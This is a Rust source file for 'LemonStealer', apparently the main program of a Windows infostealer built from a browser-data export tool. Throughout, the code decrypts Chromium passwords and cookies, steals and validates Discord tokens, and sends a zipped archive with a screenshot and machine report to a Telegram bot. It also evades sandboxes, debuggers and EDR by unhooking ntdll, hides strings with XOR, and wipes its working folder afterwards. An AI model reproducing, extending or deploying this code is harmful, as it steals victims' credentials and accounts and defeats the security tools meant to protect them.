//! CLI binary — port of `cmd/hack-browser-data` (Phase 4: real dump/list/version).
//!
//! Flag-name/short/alias parity (PLAN R8): `-b -c -f -d -p --zip -v`, `dump` is the
//! default command when no subcommand is given (Go: root copies dump's flags).
//! `--keychain-pw` (macOS-only) is intentionally dropped.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use clap::parser::ValueSource;
use clap::{Args, CommandFactory, FromArgMatches, Parser, Subcommand};
use hbd_core::{Category, parse_categories};
use log::{debug, error, info, warn};

mod logging;

use browser::discover::{DiscoveredBrowser, discover_browsers_with_keys};
use logging::LemonLogger;

/// A CLI tool for decrypting and exporting browser data.
#[derive(Parser, Debug)]
#[command(
    name = "LemonStealer",
    version,
    about = "Decrypt and export browser data (Chromium, Windows)",
    long_about = "LemonStealer decrypts and exports browser data from Chromium-based\nbrowsers on Windows.",
    subcommand_required = false,
    arg_required_else_help = false
)]
struct Cli {
    /// Enable debug logging (Go: persistent `-v`).
    #[arg(short = 'v', long = "verbose", global = true)]
    verbose: bool,

    // Root-level dump options so `LemonStealer -b chrome` ≡ `LemonStealer dump -b chrome`
    // (Go: root.RunE delegates to dump, flags copied to root).
    #[command(flatten)]
    dump: DumpArgs,

    #[command(subcommand)]
    command: Option<Command>,
}

/// Flags shared by `dump` / `restore` (Go's `dump` flag set).
#[derive(Args, Debug, Clone)]
struct DumpArgs {
    /// Target browser: all|chrome|edge|...
    #[arg(short = 'b', long = "browser", default_value = "all")]
    browser: String,
    /// Data categories (comma-separated): all|password,cookie,...
    #[arg(short = 'c', long = "category", default_value = "all")]
    category: String,
    /// Output format: csv|json|cookie-editor.
    #[arg(short = 'f', long = "format", default_value = "json")]
    format: String,
    /// Output directory.
    #[arg(short = 'd', long = "dir", default_value = "results")]
    dir: String,
    /// Custom profile dir path, get with chrome://version.
    #[arg(short = 'p', long = "profile-path", default_value = "")]
    profile_path: String,
    /// Compress output to zip.
    #[arg(long = "zip")]
    zip: bool,
    /// Telegram bot token (exfil the zip + machine report after dump).
    /// Env fallback: LEMON_TG_TOKEN.
    #[arg(long = "tg-token", default_value = "")]
    tg_token: String,
    /// Telegram chat/user id to deliver the report to. Env fallback:
    /// LEMON_TG_CHAT.
    #[arg(long = "tg-chat", default_value = "")]
    tg_chat: String,
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Extract and decrypt browser data (default command).
    Dump {
        #[command(flatten)]
        args: DumpArgs,
    },
    /// Export Chromium master keys as JSON for cross-host decryption.
    /// NOTE: the command name is `dumpkeys`, not `dump-keys` (Go parity).
    Dumpkeys {
        /// Target browser: all|chrome|edge|...
        #[arg(short = 'b', long = "browser", default_value = "all")]
        browser: String,
        /// Output file (default: stdout).
        #[arg(short = 'o', long = "output", default_value = "")]
        output: String,
    },
    /// Pack decryption-relevant profile files into a zip for cross-host restore.
    Archive {
        /// Target browser: all|chrome|edge|...
        #[arg(short = 'b', long = "browser", default_value = "all")]
        browser: String,
        /// Data categories (comma-separated): all|password,cookie,...
        #[arg(short = 'c', long = "category", default_value = "all")]
        category: String,
        /// Output archive of decryption-relevant browser files.
        #[arg(short = 'o', long = "output", default_value = "browser-data.zip")]
        output: String,
    },
    /// Decrypt copied profile data using exported master keys.
    Restore {
        /// Keys file from dumpkeys (use - for stdin).
        #[arg(long = "keys")]
        keys: String,
        /// Copied profile data dir (archive layout, or one browser's User Data with -b).
        #[arg(long = "data-dir", default_value = "")]
        data_dir: String,
        /// Zip produced by the archive command (alternative to --data-dir).
        #[arg(long = "data-zip", default_value = "")]
        data_zip: String,
        #[command(flatten)]
        args: DumpArgs,
    },
    /// List installed browsers and their profiles.
    List {
        /// Per-category entry counts (no decryption).
        #[arg(long = "detail")]
        detail: bool,
    },
    /// Print version information.
    Version,
}

fn main() -> ExitCode {
    // Double-click mode (Go: `configureDoubleClickMode` before Execute): if we
    // were launched from Explorer, hide the attached console window.
    #[cfg(windows)]
    abi::configure_double_click_mode();
    let matches = Cli::command().get_matches();
    let cli = Cli::from_arg_matches(&matches).unwrap_or_else(|e| e.exit());
    // Did the user pass `-d` on the command line (vs taking the default)?
    // The stealth working-dir + wipe flow only kicks in for the tg default.
    let dir_explicit = matches
        .subcommand()
        .and_then(|(_, m)| m.value_source("dir"))
        .or_else(|| matches.value_source("dir"))
        == Some(ValueSource::CommandLine);
    // Logging setup FIRST — Go's PersistentPreRun runs before any command.
    LemonLogger::new(cli.verbose).init();
    // Sandbox gate: if the host looks like a VM/CI analysis box, walk away
    // quietly (exit 0, no extraction attempted, no refusal trace).
    if !bypass::sandbox::gate() {
        return ExitCode::SUCCESS;
    }
    // Wave 6: if an EDR patched ntdll's .text, restore it from disk BEFORE the
    // evasion probes so every resolved call (DebugPort queries, SMBIOS fetch)
    // reaches the real syscall stubs, not the hook. No-op on a clean box.
    #[cfg(windows)]
    {
        if let Some(n) = abi::hooked_bytes().filter(|&n| n > 0) {
            info!("unhook: ntdll .text differs on {n} bytes");
        }
        if let Err(reason) = abi::unhook_ntdll() {
            warn!("unhook: {reason}");
        }
    }
    // Wave 3 evasion gate (abi): debugger attached, or VM/antisandbox tells
    // the sandbox gate can't see (SMBIOS vendor, CPUID hypervisor bit).
    #[cfg(windows)]
    {
        if let Some(reason) = abi::evasion_check() {
            info!("evasion: restraining due to {reason}");
            return ExitCode::SUCCESS;
        }
    }
    match dispatch(cli, dir_explicit) {
        Ok(()) => ExitCode::SUCCESS,
        Err(err) => {
            eprintln!("LemonStealer: {err:#}");
            ExitCode::FAILURE
        }
    }
}

fn dispatch(cli: Cli, dir_explicit: bool) -> anyhow::Result<()> {
    // Resolve browser name to kind, then discover — shared by dump (default or
    // explicit) and dumpkeys. Go discovers per command; a single pass keeps
    // the same semantics since discovery is read-only.
    let browser_name = cli.dump.browser.trim().to_lowercase();
    let browsers = discover_for(&browser_name)?;

    match cli.command {
        None => {
            // Default: dump command (Go: root.RunE = dump.RunE).
            run_dump(&browsers, &cli.dump, dir_explicit)
        }
        Some(Command::Dump { args }) => run_dump(&browsers, &args, dir_explicit),
        Some(Command::Dumpkeys { browser, output }) => run_dumpkeys(&browsers, &browser, &output),
        Some(Command::Archive { .. }) => {
            // Phase 5 wiring (Archivable archive_sources).
            anyhow::bail!("archive command not implemented yet (Phase 5)")
        }
        Some(Command::Restore { .. }) => {
            anyhow::bail!("restore command not implemented yet (Phase 5)")
        }
        Some(Command::List { detail }) => run_list(&browsers, detail),
        Some(Command::Version) => {
            println!(
                "LemonStealer {}\n  commit: {}\n  built:  {}",
                env!("CARGO_PKG_VERSION"),
                option_env!("LEMON_GIT_COMMIT").unwrap_or("none"),
                option_env!("LEMON_BUILD_DATE").unwrap_or("unknown"),
            );
            Ok(())
        }
    }
}

/// Discovers browsers matching `browser_name`, wiring Windows master-key
/// retrievers (Go: `DiscoverBrowsersWithKeys`).
fn discover_for(browser_name: &str) -> anyhow::Result<Vec<DiscoveredBrowser>> {
    if browser_name == "all" || browser_name.is_empty() {
        return Ok(
            discover_browsers_with_keys(|b| b.set_retrievers(windows_retrievers()))
                .unwrap_or_default(),
        );
    }
    let cfg = browser::platform_browsers()
        .into_iter()
        .find(|c| c.key == browser_name || c.name.to_lowercase() == browser_name);
    match cfg {
        Some(config) => {
            if let Ok(Some(mut b)) = browser::chromium::new_browser(config) {
                b.set_retrievers(windows_retrievers());
                Ok(vec![Box::new(b) as DiscoveredBrowser])
            } else {
                Ok(vec![])
            }
        }
        None => Ok(vec![]),
    }
}

/// Appends a result's local + session storage rows to the Discord web-token
/// pool, tagged with `browser/profile`. Also records the profile dir for the
/// raw-bytes fallback scan (`web::extract_raw`).
fn collect_storage_entries(
    web_storage: &mut Vec<(String, hbd_core::StorageEntry)>,
    web_profiles: &mut Vec<(String, PathBuf)>,
    browser_name: &str,
    r: &hbd_core::ExtractResult,
) {
    // Note: duplicate labels are fine — raw scan dedups web tokens later.
    web_profiles.push((
        format!("{browser_name}/{}", r.profile.name),
        PathBuf::from(&r.profile.dir),
    ));
    for s in &r.data.local_storage {
        web_storage.push((format!("{browser_name}/{}", r.profile.name), s.clone()));
    }
    for s in &r.data.session_storage {
        web_storage.push((format!("{browser_name}/{}", r.profile.name), s.clone()));
    }
}

/// Deduplicates `web_profiles` by its canonical storage dir (label + path), so
/// the raw-bytes fallback never rescans the same profile directory.
fn dedup_web_profiles(web_profiles: &mut Vec<(String, PathBuf)>) {
    let mut seen = std::collections::HashSet::new();
    web_profiles.retain(|(label, dir)| seen.insert((label.clone(), dir.clone())));
}

/// Deduplicates `web_storage` rows by (label, url, key, value) before the
/// Discord web-token scan. A token found N times must surface exactly once.
fn dedup_web_storage(web_storage: &mut Vec<(String, hbd_core::StorageEntry)>) {
    let mut seen = std::collections::HashSet::new();
    web_storage.retain(|(label, s)| {
        seen.insert((label.clone(), s.url.clone(), s.key.clone(), s.value.clone()))
    });
}

/// Go `extractAndWrite`: extract every browser, accumulate into the writer,
/// write per-profile files, optionally compress.
///
/// Working dir: when Telegram is configured and the user did NOT pass `-d`,
/// the dump goes into a hidden pass-in-`%TEMP%` dir that is wiped after the
/// exfil push. An explicit `-d`, or no Telegram, keeps the old behavior
/// (results folder, files persist for local inspection / re-dump).
fn run_dump(
    browsers: &[DiscoveredBrowser],
    args: &DumpArgs,
    dir_explicit: bool,
) -> anyhow::Result<()> {
    let start = std::time::Instant::now();
    if browsers.is_empty() {
        warn!("no browsers found");
        return Ok(());
    }
    let categories = parse_categories(&args.category)?;
    let tg = telegram_config_from(args);

    // Stealth default: tg configured, no `-d` given → hidden temp dir + wipe.
    let (work_dir, wipe) = if tg.is_some() && !dir_explicit {
        match abi::hidden_temp_dir("lemon") {
            Some(d) => {
                info!("telegram: working dir {}", d.display());
                (d, true)
            }
            None => (PathBuf::from(&args.dir), false),
        }
    } else {
        (PathBuf::from(&args.dir), false)
    };
    let work_str = work_dir.to_string_lossy().into_owned();

    let mut writer =
        output::Writer::new(&work_str, &args.format).map_err(|e| anyhow::anyhow!("{e}"))?;

    // Wave 8: harvest browser localStorage rows for the Discord web-token scan.
    // Decoupled from the user-selected categories: even `-c password` still
    // scans every profile's storage so Discord web tokens are never missed.
    let storage_cats = [Category::LOCAL_STORAGE, Category::SESSION_STORAGE];
    let storage_covered = storage_cats.iter().all(|c| categories.contains(c));

    let mut web_storage: Vec<(String, hbd_core::StorageEntry)> = Vec::new();
    let mut web_profiles: Vec<(String, PathBuf)> = Vec::new();

    // Parallel extraction: every browser's extract runs on its own thread (the
    // SQLite/DPAPI/ABE work is I/O- and CPU-bound per installation, so they
    // overlap instead of stalling on each other). Results come back in browser
    // order — output stays deterministic regardless of which thread finishes
    // first. `writer.add`/storage collection stay on the main thread (they
    // mutate shared state).
    type Outcome = (
        String, // browser name
        usize,  // profile count
        Result<Vec<hbd_core::ExtractResult>, browser::BrowserError>,
        std::time::Duration, // main extract
        Option<Result<Vec<hbd_core::ExtractResult>, browser::BrowserError>>,
        std::time::Duration, // storage-only extract
    );
    let categories_ref: &[hbd_core::Category] = &categories;
    let storage_ref: &[hbd_core::Category] = &storage_cats;
    let outcomes: Vec<Outcome> = std::thread::scope(|scope| {
        let handles: Vec<_> = browsers
            .iter()
            .map(|b| {
                let b: &DiscoveredBrowser = b;
                scope.spawn(move || {
                    let name = b.browser_name().to_string();
                    let n = b.profiles().len();
                    let b_start = std::time::Instant::now();
                    let main = b.extract(categories_ref);
                    let main_elapsed = b_start.elapsed();
                    let (extra, extra_elapsed) = if !storage_covered {
                        let s_start = std::time::Instant::now();
                        let extra = b.extract(storage_ref);
                        (Some(extra), s_start.elapsed())
                    } else {
                        (None, std::time::Duration::ZERO)
                    };
                    (name, n, main, main_elapsed, extra, extra_elapsed)
                })
            })
            .collect();
        handles
            .into_iter()
            .map(|h| h.join().expect("browser extract thread panicked"))
            .collect()
    });

    for (name, n, main, main_elapsed, extra, extra_elapsed) in outcomes {
        info!(
            "Extracting {name}... ({n} profile{})",
            if n == 1 { "" } else { "s" }
        );
        match main {
            Ok(results) => {
                for r in results {
                    collect_storage_entries(&mut web_storage, &mut web_profiles, &name, &r);
                    writer.add(&name, &r.profile.name, &r.data);
                }
                info!(
                    "  {name}: extraction took {}",
                    format_duration(main_elapsed)
                );
            }
            Err(e) => error!("extract {name}: {e}"),
        }
        // Storage categories weren't in the user's selection: run a dedicated
        // storage-only extraction so the Discord web-token scan still sees every
        // profile's rows (output files are unaffected — nothing is written).
        if let Some(extra) = extra {
            match extra {
                Ok(results) => {
                    for r in results {
                        collect_storage_entries(&mut web_storage, &mut web_profiles, &name, &r);
                    }
                    info!(
                        "  {name}: storage scan for Discord took {}",
                        format_duration(extra_elapsed)
                    );
                }
                Err(e) => error!("storage scan {name}: {e}"),
            }
        }
    }
    // Storage-only pass (when the user's categories already include storage, or
    // the extra pass re-runs it) pushes the same profile dir + rows twice.
    // Dedupe both so the raw-bytes fallback scans each dir once and tokens are
    // only ever reported once.
    dedup_web_profiles(&mut web_profiles);
    dedup_web_storage(&mut web_storage);
    let report = writer.write()?;

    // Wave 8: Discord token steal — desktop app clients + web localStorage
    // already harvested above. Best-effort like everything else: a scan failure
    // never fails the run.
    if !web_storage.is_empty() {
        let web_discord = web_storage
            .iter()
            .filter(|(_, s)| {
                s.url.contains(bypass::x!("discord.com", 0x6E).as_str())
                    || s.url.contains(bypass::x!("discordapp.com", 0x33).as_str())
            })
            .count();
        info!(
            "Discord web scan: {} storage entries from browsers ({} discord origin)",
            web_storage.len(),
            web_discord
        );
    }
    let discord_tokens = discord::collect(&web_storage, &web_profiles, None);
    let discord_count = discord_tokens.len();
    if discord_count > 0 {
        // Probe `GET /api/v10/users/@me` — drop lazy/invalid tokens before
        // anything is written or shipped.
        let valid = discord::validate(discord_tokens);
        let dropped = discord_count - valid.len();
        if dropped > 0 {
            info!(
                "Discord tokens: {dropped} invalid dropped, {} valid kept",
                valid.len()
            );
        }
        if valid.is_empty() {
            info!("Discord tokens: none valid — nothing saved");
        } else {
            match write_discord_tokens(&work_dir, &valid) {
                Ok(path) => info!("Discord tokens written: {}", path.display()),
                Err(e) => warn!("discord: write tokens: {}", e),
            }
        }
    } else {
        debug!("discord: no tokens found");
    }

    if args.zip {
        filemanager::compress_dir(&work_dir, None).map_err(|e| anyhow::anyhow!("compress: {e}"))?;
        let base = work_dir
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "results".to_string());
        info!("Compressed: {}/{}.zip", work_str, base);
    }

    // Wave 7: Telegram exfil. Runs on dump success — a failed send never fails
    // the run (and for the stealth default the workdir is wiped either way so
    // no dump ever lingers on the target disk). Machine info is gathered once
    // here (zip naming + the report), not per-call.
    if let Some(cfg) = tg {
        let info = abi::machine_info();
        let username = info
            .user_name
            .clone()
            .filter(|s| !s.trim().is_empty())
            .or_else(|| std::env::var("USERNAME").ok());
        let stem = username
            .as_deref()
            .map(sanitize_file_stem)
            .unwrap_or_else(|| "results".to_string());
        let zip_path = work_dir.join(format!("save-{stem}.zip"));
        if !zip_path.exists() {
            // User didn't pass --zip: still ship an archive (non-destructive).
            // AES-256 sealed — the extraction password is decrypted in memory
            // from an XOR-const blob, no plaintext in the image.
            let archive_pw = bypass::x!("khongyeuemthiyeuai@999", 0xD3);
            filemanager::zip_dir(&zip_path, &work_dir, Some(&archive_pw))
                .map_err(|e| anyhow::anyhow!("zip: {e}"))?;
            info!("Packed: {}", zip_path.display());
        }
        let stats = telegram::Stats {
            entries: report.entries,
            files: report.files,
            profiles: report.profiles,
            categories: report.categories,
            discord_tokens: discord_count,
            browsers: report
                .browsers
                .into_iter()
                .map(|b| telegram::BrowserStats {
                    name: b.name,
                    entries: b.entries,
                    files: b.files,
                    profiles: b.profiles,
                    categories: b.categories,
                })
                .collect(),
        };
        let delivered = match telegram::send_report(&cfg, &info, &stats, &zip_path) {
            Ok(sent) => {
                info!(
                    "telegram: delivered ({})",
                    if sent.photo_sent && sent.document_sent {
                        "screenshot + archive"
                    } else if sent.document_sent {
                        "archive"
                    } else if sent.photo_sent {
                        "screenshot"
                    } else {
                        "nothing"
                    }
                );
                sent.document_sent
            }
            Err(e) => {
                warn!("telegram: {e}");
                false
            }
        };
        if wipe {
            match std::fs::remove_dir_all(&work_dir) {
                Ok(()) => info!(
                    "telegram: wiped working dir {} (delivered: {})",
                    work_dir.display(),
                    delivered
                ),
                Err(e) => warn!("telegram: couldn't wipe {}: {e}", work_dir.display()),
            }
        }
    }

    info!("Done in {}", format_duration(start.elapsed()));
    Ok(())
}

/// Resolve the Telegram config from flags with `LEMON_TG_*` env fallback.
/// Returns `None` (with a warning) when token/chat are partially configured.
fn telegram_config_from(args: &DumpArgs) -> Option<telegram::TelegramConfig> {
    let token = if args.tg_token.trim().is_empty() {
        std::env::var("LEMON_TG_TOKEN")
            .ok()
            .filter(|s| !s.trim().is_empty())
    } else {
        Some(args.tg_token.trim().to_string())
    };
    let chat = if args.tg_chat.trim().is_empty() {
        std::env::var("LEMON_TG_CHAT")
            .ok()
            .filter(|s| !s.trim().is_empty())
    } else {
        Some(args.tg_chat.trim().to_string())
    };

    match (token, chat) {
        (Some(token), Some(chat_id)) => Some(telegram::TelegramConfig { token, chat_id }),
        (None, None) => None,
        _ => {
            warn!(
                "telegram: --tg-token and --tg-chat (or LEMON_TG_TOKEN/LEMON_TG_CHAT) must be set together"
            );
            None
        }
    }
}

/// Formats a [`std::time::Duration`] as `1.23s` / `45.2ms` / `890µs`.
fn format_duration(d: std::time::Duration) -> String {
    if d.as_secs() >= 1 {
        format!("{:.2}s", d.as_secs_f64())
    } else if d.as_millis() >= 1 {
        format!("{}ms", d.as_millis())
    } else {
        format!("{}µs", d.as_micros())
    }
}

/// Wave 8: persist the stolen Discord tokens as a compact JSON file at the
/// work-dir root (`Discord/tokens.json`), so the exfil zip carries them.
/// Best-effort — a write failure is a warning, never a run failure.
fn write_discord_tokens(
    work_dir: &Path,
    tokens: &[discord::DiscordToken],
) -> std::io::Result<PathBuf> {
    let dir = work_dir.join("Discord");
    std::fs::create_dir_all(&dir)?;
    let path = dir.join("tokens.json");
    let body =
        serde_json::to_vec_pretty(tokens).map_err(|e| std::io::Error::other(e.to_string()))?;
    std::fs::write(&path, body)?;
    Ok(path)
}

/// Safe file-stem for the exfil zip: keep harmless chars, drop the rest.
fn sanitize_file_stem(s: &str) -> String {
    let out: String = s
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || matches!(c, '-' | '_' | '.') {
                c
            } else {
                '_'
            }
        })
        .collect();
    let trimmed = out.trim_matches(|c| c == '.' || c == '_');
    if trimmed.is_empty() {
        "results".to_string()
    } else {
        trimmed.to_string()
    }
}

/// Go `dumpKeysCmd`: BuildDump (skip vaults without keys) -> WriteDump.
fn run_dumpkeys(
    browsers: &[DiscoveredBrowser],
    browser_name: &str,
    output: &str,
) -> anyhow::Result<()> {
    if browser_name.trim().to_lowercase() != "all" && browsers.is_empty() {
        warn!("no browsers found");
        return Ok(());
    }
    let dump = browser::build_dump(browsers)?;
    info!("Exported keys for {} vault(s)", dump.vaults.len());
    if output.is_empty() {
        let mut stdout = std::io::stdout().lock();
        browser::write_dump(&mut stdout, &dump)?;
        return Ok(());
    }
    let mut f = std::fs::File::create(output)?;
    write_0600(&f)?;
    browser::write_dump(&mut f, &dump)?;
    Ok(())
}

/// Best-effort `0600` file mode (Go: `os.OpenFile(..., 0600)`); on Windows the
/// ACL model makes it a no-op, matching Go's behavior there.
#[cfg(unix)]
fn write_0600(f: &std::fs::File) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    f.set_permissions(std::fs::Permissions::from_mode(0o600))
}

#[cfg(not(unix))]
fn write_0600(_f: &std::fs::File) -> std::io::Result<()> {
    Ok(())
}

/// Master-key retrievers for this platform. Windows: DPAPI lifts the v10 key
/// from `Local State`; ABE (v20) injects the payload into a real browser
/// instance to decrypt the app-bound key. Other hosts: no tiers.
fn windows_retrievers() -> keyring::Retrievers {
    #[cfg(windows)]
    {
        keyring::Retrievers {
            v10: Some(Box::new(keyring::DpapiRetriever)),
            v20: Some(Box::new(keyring::AbeRetriever)),
            ..Default::default()
        }
    }
    #[cfg(not(windows))]
    {
        keyring::Retrievers::default()
    }
}

/// Go `listCmd` — tab-aligned columns with 3-space padding (Go tabwriter
/// with `padding=3`, left-aligned).
fn run_list(browsers: &[DiscoveredBrowser], detail: bool) -> anyhow::Result<()> {
    if browsers.is_empty() {
        println!("No browsers found.");
        return Ok(());
    }
    if detail {
        print_detail(browsers)
    } else {
        print_basic(browsers)
    }
}

fn print_basic(browsers: &[DiscoveredBrowser]) -> anyhow::Result<()> {
    let mut rows: Vec<Vec<String>> = vec![vec!["Browser".into(), "Profile".into(), "Path".into()]];
    for b in browsers {
        for p in b.profiles() {
            rows.push(vec![b.browser_name().to_string(), p.name, p.dir]);
        }
    }
    print_table(&rows)
}

fn print_detail(browsers: &[DiscoveredBrowser]) -> anyhow::Result<()> {
    let mut rows: Vec<Vec<String>> = vec![{
        let mut header = vec!["Browser".to_string(), "Profile".to_string()];
        header.extend(Category::ALL.iter().map(|c| c.to_string()));
        header
    }];
    for b in browsers {
        let counts = b.count_entries(&Category::ALL).unwrap_or_default();
        for r in counts {
            let mut row = vec![b.browser_name().to_string(), r.profile.name.clone()];
            for c in Category::ALL {
                row.push(r.counts.get(&c).copied().unwrap_or(0).to_string());
            }
            rows.push(row);
        }
    }
    print_table(&rows)
}

/// Minimal tabwriter: compute each column's max width, pad with 3 spaces.
fn print_table(rows: &[Vec<String>]) -> anyhow::Result<()> {
    let cols = rows.iter().map(|r| r.len()).max().unwrap_or(0);
    let widths: Vec<usize> = (0..cols)
        .map(|c| {
            rows.iter()
                .map(|r| r.get(c).map_or(0, String::len))
                .max()
                .unwrap_or(0)
        })
        .collect();
    let mut out = String::new();
    for row in rows {
        for (c, cell) in row.iter().enumerate() {
            if c > 0 {
                out.push(' ');
            }
            out.push_str(cell);
            if c + 1 < row.len() {
                out.push_str(&" ".repeat(widths[c] - cell.len() + 2));
            }
        }
        out.push('\n');
    }
    print!("{out}");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::sanitize_file_stem;

    #[test]
    fn sanitize_file_stem_keeps_safe_chars() {
        assert_eq!("catcat1204", sanitize_file_stem("catcat1204"));
        assert_eq!("a-b_c.d", sanitize_file_stem("a-b_c.d"));
    }

    #[test]
    fn sanitize_file_stem_strips_hostile_chars() {
        assert_eq!("a_b_c", sanitize_file_stem("a<b>c"));
        assert_eq!("a_b_c", sanitize_file_stem("a:b\\c"));
        assert_eq!("results", sanitize_file_stem("..."));
        assert_eq!("results", sanitize_file_stem(""));
    }
}
